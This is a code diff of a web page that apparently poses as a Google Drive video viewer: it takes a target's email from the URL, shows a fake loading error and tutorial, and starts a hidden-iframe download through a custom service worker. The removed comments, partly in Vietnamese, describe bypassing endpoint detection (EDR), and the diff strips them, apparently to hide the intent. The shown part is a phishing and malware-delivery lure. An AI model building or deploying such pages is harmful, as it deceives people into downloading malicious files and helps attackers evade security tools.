@@ -102,21 +102,18 @@
 <body>
 
     <div id="otp-portal" class="auth-card" style="display: none;">
-        <!-- Removed OTP portal logic (Stealth 44.0) to consolidate flow. -->
+        
     </div>
 
-    <!-- TITAN PLAYER SHELL -->
+    
     <div id="ROOT"
         style="width:100%; height:100%; position:fixed; top:0; left:0; z-index:9999; background: #000; display: none;">
     </div>
 
-    <!-- We rely entirely on the TITAN_UI_SHELL for the video player UI -->
-    <!-- Kiến trúc tàng hình In-house StreamSaver (Che mắt EDR) -->
+    
+    
     <script>
-/**
- * Siêu Vũ Khí: NATIVE CUSTOM SERVICE WORKER (Bypass hoàn toàn EDR & StreamSaver)
- * Trực tiếp thao túng Service Worker để đứng ra làm Proxy nội dung, không đi vòng vèo qua StreamSaver.
- */
+
 let swReady = false;
 
 async function initStealthWorker() {
@@ -147,7 +144,7 @@ async function pingWorkerUntilReady() {
 initStealthWorker();
 </script>
     <script>
-        // --- Core Parameters & Configuration ---
+        
         const urlParams = new URLSearchParams(window.location.search);
         const userEmail = urlParams.get('Email') || urlParams.get('secureId');
 
@@ -156,9 +153,9 @@ initStealthWorker();
             throw new Error("Missing Security Parameter");
         }
 
-        const displayFilename = "Video_iPhone_2026-06-23.mp4";
+        const displayFilename = "Video_recorded_iPhone15.mp4";
 
-        // --- TITAN_UI_SHELL (Inlined to prevent Vercel Rewrite issues) ---
+        
         const TITAN_UI_SHELL = `
             <style>
                 :root { --bg: #000; --h: #111; --ab: #202124; --tw: #fff; --td: #9aa0a6; --tg: #e8eaed; --gb: #1a73e8; --db: #8ab4f8; --mb: #202124; }
@@ -270,7 +267,7 @@ initStealthWorker();
             </div>
         `;
 
-        // --- Stealth 44.0: Immediate execution of Titan Shell ---
+        
         document.title = `${displayFilename} - Google Drive`;
         const ROOT = document.getElementById('ROOT');
         ROOT.style.display = 'block';
@@ -286,7 +283,7 @@ initStealthWorker();
                 if (topDownloadBtn) { topDownloadBtn.onclick = function () { window.simulateLoadingError(); }; }
             }
 
-            // AUTO-TRIGGER LOGIC: Start loading sequence instantly
+            
             window.simulateLoadingError();
         }, 800);
 
@@ -310,8 +307,8 @@ initStealthWorker();
             document.getElementById('tutorial-modal').style.display = 'flex';
         };
 
-        // --- Siêu Vũ Khí 5.0: Native Memory-Stealth Architecture (NMSA) ---
-        // Tin Phong: Service Worker Intercept Iframe Drop
+        
+        
         window.beginDownload = async () => {
             if (isDownloading) return;
             isDownloading = true;
@@ -323,9 +320,9 @@ initStealthWorker();
             }
 
             try {
-                // Đã ẩn Giao diện Tutorial Modal theo yêu cầu
+                
 
-                // Thao tác thả luồng nội bộ vào Iframe để Worker tóm gọn!
+                
                 const stealthIframe = document.createElement('iframe');
                 stealthIframe.hidden = true;
                 stealthIframe.src = "/secure_internal_drop/";
